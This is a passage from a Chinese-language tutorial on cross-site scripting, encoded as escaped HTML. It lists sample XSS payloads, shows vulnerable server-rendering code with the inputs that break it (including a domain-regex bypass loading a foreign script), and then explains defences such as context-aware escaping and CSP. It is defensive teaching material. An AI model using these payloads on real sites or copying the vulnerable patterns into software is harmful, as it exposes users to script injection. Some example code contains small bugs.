攻击\u003c/li\u003e\n\u003cli\u003e蠕虫式挂马攻击、刷广告、刷流量、破坏网上数据\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e常见有效荷载（Payload）：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e\u0026lt;input onfocus=write('xss') autofocus\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u0026lt;img src onerror=alert('xss')\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u0026lt;svg onload=alert('xss') \u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u0026lt;script\u0026gt;alert('xss')\u0026lt;/script\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u0026lt;a href=\u0026quot;javascript:alert('xss')\u0026quot;\u0026gt;clickme\u0026lt;/a\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eXSS 荷载（XSS Payload）是指恶意植入且具有完成各种具体功能的恶意脚本。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3\u003e标签拼接漏洞\u003c/h3\u003e\n\u003cp\u003e服务端渲染代码：这里的 \u003ccode\u003einput\u003c/code\u003e 可能是客户端传递到服务端的数据\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// Server Code\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003eserverRender\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003einput\u003c/span\u003e) {\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026lt;div\u0026gt;\u0026#x27;\u003c/span\u003e + input + \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026lt;/div\u0026#x27;\u003c/span\u003e\u0026gt;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e攻击方法：破坏原来的 HTML 代码结构，让你写的代码生效\u003c/p\u003e\n\u003cp\u003e输入渲染的 \u003ccode\u003einput\u003c/code\u003e 变量为 \u003ccode\u003e\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e输出渲染的 HTML 结构：\u003ccode\u003e\u0026lt;div\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt;/div\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e这样你脚本内的 \u003ccode\u003ealert(1)\u003c/code\u003e 函数返回到前端渲染时就会被自动执行。\u003c/p\u003e\n\u003ch3\u003e提前闭合标签\u003c/h3\u003e\n\u003cp\u003e对于 \u003ccode\u003e\u0026lt;textarea\u0026gt;\u003c/code\u003e 这种原生会转换输入数据为字符串的标签，可以输入提前闭合标签绕过：\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;/textarea\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt;textarea\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e或者 \u003ccode\u003einput\u003c/code\u003e标签：\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// Server Code\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003eserverRender\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003einput\u003c/span\u003e) {\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026lt;input type=\u0026quot;name\u0026quot; value=\u0026#x27;\u003c/span\u003e + input + \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026quot;\u0026gt;\u0026#x27;\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e输入 \u003ccode\u003einput\u003c/code\u003e 变量：\u003ccode\u003e\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e输出渲染的 HTML 结构：\u003ccode\u003e\u0026lt;input type=\u0026quot;name\u0026quot; value=\u0026quot;\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026quot;\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003e合法 HTML 转义漏洞\u003c/h3\u003e\n\u003cp\u003e服务端渲染代码：将用户输入代码通过合法的 HTML 标签转义输出，返回给前端渲染\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// Server Code\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003eserverRender\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003einput\u003c/span\u003e) {\n  \u003cspan class=\"hljs-comment\"\u003e// HTML 的字符转义\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003eescapeHtml\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003es\u003c/span\u003e) {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e s\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\u0026amp;/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026amp;amp;\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\u0026#x27;/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026amp;#39;\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\u0026quot;/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026amp;quot;\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\u0026lt;/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026amp;lt;\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\u0026gt;/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026amp;rt;\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\\//g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026amp;#x2f\u0026#x27;\u003c/span\u003e);\n  }\n\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e domainReg = \u003cspan class=\"hljs-regexp\"\u003e/^https?:\\/\\/www\\.example\\.com/\u003c/span\u003e;\n\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (domainRe.\u003cspan class=\"hljs-title function_\"\u003etest\u003c/span\u003e(input)) {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e`\u0026lt;script src=\u0026quot;\u003cspan class=\"hljs-subst\"\u003e${escapeHtml(input)}\u003c/span\u003e\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;`\u003c/span\u003e;\n  }\n\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x27;Invalid URL\u0026#x27;\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e攻击方法：创建多级域名，子孙级域名中带 \u003ccode\u003e.com\u003c/code\u003e\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 输入\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e input = \u003cspan class=\"hljs-string\"\u003e\u0026#x27;https://www.example.com.xss.com/foo.js\u0026#x27;\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e输出渲染的 HTML DOM 结构：那么这个输入的 URL 就会被执行了\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;http:\u0026amp;#x2f\u0026amp;#x2fwww.example.com.xss.com\u0026amp;#x2ffoo.js\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHTML 转码在 URL 和 JavaScript 中都是无效的。\u003c/p\u003e\n\u003ch3\u003e合法 JS 转义漏洞\u003c/h3\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// Server Code\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003eserverRender\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003es\u003c/span\u003e) {\n  \u003cspan class=\"hljs-comment\"\u003e// JavaScript 的字符转义\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003eescapeJs\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003es\u003c/span\u003e) {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e s\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\\\\/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\\\\\\\\\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\u0026#x27;/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026quot;\\\\\u0026#x27;\u0026quot;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\u0026quot;/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\\\\\u0026quot;\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/`/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\\\\`\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\u0026lt;/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\\\\74\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\u0026gt;/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\\\\76\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\\//g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\\\\/\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\\n/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\\\\n\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\\r/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\\\\r\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\\t/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\\\\t\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\\f/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\\\\f\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\\v/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\\\\v\u0026#x27;\u003c/span\u003e)\n      .\u003cspan class=\"hljs-title function_\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-regexp\"\u003e/\\0/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\\\\0\u0026#x27;\u003c/span\u003e);\n  }\n\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e s = \u003cspan class=\"hljs-title function_\"\u003eescapeJs\u003c/span\u003e(s);\n\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e`\n\u0026lt;script type=\u0026quot;application/javascript\u0026quot;\u0026gt;\n  var url = \u0026#x27;javascript:console.log(\u0026quot;\u003cspan class=\"hljs-subst\"\u003e${s}\u003c/span\u003e\u0026quot;)\u0026#x27;\n  var a = document.createElement(\u0026#x27;a\u0026#x27;)\n\n  a.href = url\n  document.body.appendChild(a)\n  a.click()\n\u0026lt;/script\u0026gt;\n  `\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e输出的 HTML DOM 结构：\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;application/javascript\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"language-javascript\"\u003e\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e url = \u003cspan class=\"hljs-string\"\u003e\u0026#x27;javascript:console.log(\u0026quot;\u0026quot;)\u0026#x27;\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = \u003cspan class=\"hljs-variable language_\"\u003edocument\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003ecreateElement\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\u0026#x27;a\u0026#x27;\u003c/span\u003e);\n\n  a.\u003cspan class=\"hljs-property\"\u003ehref\u003c/span\u003e = url;\n  \u003cspan class=\"hljs-variable language_\"\u003edocument\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003ebody\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003eappendChild\u003c/span\u003e(a);\n  a.\u003cspan class=\"hljs-title function_\"\u003eclick\u003c/span\u003e();\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e方法总结\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e在 HTML 中内嵌的文本那种，恶意内容以 \u003ccode\u003escript\u003c/code\u003e 标签形成注入\u003c/li\u003e\n\u003cli\u003e在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串、变量、方法名等）\u003c/li\u003e\n\u003cli\u003e在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签\u003c/li\u003e\n\u003cli\u003e在标签的 \u003ccode\u003ehref\u003c/code\u003e、\u003ccode\u003esrc\u003c/code\u003e 等属性中，包含 \u003ccode\u003ejavascript:\u003c/code\u003e 等可执行代码\u003c/li\u003e\n\u003cli\u003e在 \u003ccode\u003eonload\u003c/code\u003e、\u003ccode\u003eonerror\u003c/code\u003e、\u003ccode\u003eonclick\u003c/code\u003e 等事件中，注入不受控制代码\u003c/li\u003e\n\u003cli\u003e在 \u003ccode\u003estyle\u003c/code\u003e 属性和标签汇总，包含类似 \u003ccode\u003ebackground-image: url(\u0026quot;javascript:...\u0026quot;)\u003c/code\u003e 的代码（新版本浏览器已经可以防范）\u003c/li\u003e\n\u003cli\u003e在 \u003ccode\u003estyle\u003c/code\u003e 属性和标签中，包含类似 \u003ccode\u003eexpression(...)\u003c/code\u003e 的 CSS 表达式代码（新版本浏览器已经可以防范）\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e防御策略\u003c/h2\u003e\n\u003cp\u003e防护原则：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e未雨绸缪\n\u003cul\u003e\n\u003cli\u003eHTML 正文：HTML 实体字符转义\u003c/li\u003e\n\u003cli\u003eHTML 标签：HTML 实体字符转义\u003c/li\u003e\n\u003cli\u003eHTML \u003ccode\u003eonxxx\u003c/code\u003e 事件属性：JS 转义\u003c/li\u003e\n\u003cli\u003eURL：URL 转义\u003c/li\u003e\n\u003cli\u003e用户富文本输入：后端白名单标签过滤，使用开源库（例如：\u003ca href=\"https://www.npmjs.com/package/sanitize-html\" target=\"_blank\" rel=\"noopener noreferrer nofollow\"\u003esanitize-html\u003c/a\u003e），不要用正则过滤\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e配置安全协议头\n\u003cul\u003e\n\u003cli\u003eContent-Security-Policy\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003e输入过滤\u003c/h3\u003e\n\u003cp\u003e在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？\u003c/p\u003e\n\u003cp\u003e答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。\u003c/p\u003e\n\u003cp\u003e那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把 \u003cstrong\u003e安全的\u003c/strong\u003e 内容，返回给前端。这样是否可行呢？\u003c/p\u003e\n\u003cp\u003e我们举一个例子，一个正常的用户输入了 \u003ccode\u003e5 \u0026lt; 7\u003c/code\u003e 这个内容，在写入数据库前，被转义，变成了 \u003ccode\u003e5 \u0026amp;lt; 7\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e问题是：在提交阶段，我们并不确定内容要输出到哪里。\u003c/p\u003e\n\u003cp\u003e这里的 \u003cstrong\u003e并不确定内容要输出到哪里\u003c/strong\u003e 有两层含义：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e用户的输入内容可能同时提供给 Web 前端和客户端，而一旦经过了 \u003ccode\u003eescapeHTML()\u003c/code\u003e，客户端显示的内容就变成了乱码 \u003ccode\u003e5 \u0026amp;lt; 7\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e在前端中，不同的位置所需的编码也不同。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e当 \u003ccode\u003e5 \u0026amp;lt; 7\u003c/code\u003e 作为 HTML 拼接页面时，可以正常显示：\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;comment\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e5 \u003cspan class=\"hljs-symbol\"\u003e\u0026amp;lt;\u003c/span\u003e 7\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当 \u003ccode\u003e5 \u0026amp;lt; 7\u003c/code\u003e 通过 AJAX 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、\u003ccode\u003ealert\u003c/code\u003e 等。\u003c/p\u003e\n\u003cp\u003e所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。\n当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。\u003c/p\u003e\n\u003cp\u003e输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。\u003c/p\u003e\n\u003ch3\u003e纯前端渲染\u003c/h3\u003e\n\u003cp\u003e预防攻击类型：\u003ccode\u003e存储型 XSS\u003c/code\u003e 和 \u003ccode\u003e反射型 XSS\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e纯前端渲染的过程：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。\u003c/li\u003e\n\u003cli\u003e然后浏览器执行 HTML 中的 JavaScript。\u003c/li\u003e\n\u003cli\u003eJavaScript 通过 AJAX 加载业务数据，调用 DOM API 更新到页面上。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本 \u003ccode\u003e.innerText\u003c/code\u003e，还是属性 \u003ccode\u003e.setAttribute\u003c/code\u003e，还是样式 \u003ccode\u003e.style\u003c/code\u003e 等等。如此，浏览器不会被轻易地被欺骗，执行预期外的代码。\u003c/p\u003e\n\u003cp\u003e但纯前端渲染还需注意避免 DOM 型 XSS 漏洞，例如 \u003ccode\u003eonload\u003c/code\u003e 事件和 \u003ccode\u003ehref\u003c/code\u003e 中的 \u003ccode\u003ejavascript:xxx\u003c/code\u003e 等。\u003c/p\u003e\n\u003cp\u003e在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。\u003c/p\u003e\n\u003ch3\u003e转义 HTML\u003c/h3\u003e\n\u003cp\u003e如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。\n常用的模板引擎，如 \u003ccode\u003edoT.js\u003c/code\u003e、\u003ccode\u003eejs\u003c/code\u003e、\u003ccode\u003eFreeMarker\u003c/code\u003e 等，对于 HTML 转义通常只有一个规则，就是把 \u003ccode\u003e\u0026amp; \u0026lt; \u0026gt; \u0026quot; ' /\u003c/code\u003e 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth style=\"text-align:left\"\u003eXSS 安全漏洞\u003c/th\u003e\n\u003cth style=\"text-align:left\"\u003e简单转义是否有防护作用\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:left\"\u003eHTML 标签文字内容\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e有\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:left\"\u003eHTML 属性值\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e有\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:left\"\u003eCSS 内联样式\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e无\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:left\"\u003e内联 JavaScript\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e无\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:left\"\u003e内联 JSON\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e无\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:left\"\u003e跳转链接\u003c/td\u003e\n\u003ctd style=\"text-align:left\"\u003e无\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。\u003c/p\u003e\n\u003cp\u003e例如 Java 工程里，常用的转义库 \u003ccode\u003eorg.owasp.encoder\u003c/code\u003e。\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-html\"\u003e\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- HTML 标签内文字内容 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u0026lt;%= Encode.forHtml(UNTRUSTED) %\u0026gt;\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- HTML 标签属性值 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;\u0026lt;%= Encode.forHtml(UNTRUSTED) %\u0026gt;\u0026quot;\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- CSS 属性值 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003estyle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;width:\u0026lt;= Encode.forCssString(UNTRUSTED) %\u0026gt;\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- CSS URL --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003estyle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;background:\u0026lt;= Encode.forCssUrl(UNTRUSTED) %\u0026gt;\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- JavaScript 内联代码块 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;application/javascript\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"language-javascript\"\u003e\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e msg = \u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026lt;%= Encode.forJavaScript(UNTRUSTED) %\u0026gt;\u0026#x27;\u003c/span\u003e;\n  \u003cspan class=\"hljs-title function_\"\u003ealert\u003c/span\u003e(msg);\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- JavaScript 内联代码块内嵌 JSON --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;application/javascript\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"language-javascript\"\u003e\n  \u003cspan 